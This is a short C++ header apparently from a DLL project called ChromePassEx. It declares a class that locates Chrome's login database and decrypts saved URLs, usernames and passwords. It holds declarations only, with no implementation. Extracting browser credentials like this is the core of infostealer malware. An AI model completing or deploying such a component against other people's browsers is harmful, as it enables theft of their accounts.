#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include "ChromeCollecter.h"

#include <string>
#include <vector>


#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12

struct userData
{
	std::string url;
	std::string username;
	std::string password;
};

class  EXPORT_F ChromePasswordCollecter : public ChromeCollecter<userData>
{	
public:
	ChromePasswordCollecter(): ChromeCollecter<userData>(){}
	~ChromePasswordCollecter()  {};
	std::vector<userData> collectData() override;

protected:
	void collectFromPath(const std::string& chromePath) override;
    bool getDbPath(const std::string& chromePath) override;
	ChromeDecrypt m_decryptor;

};

 

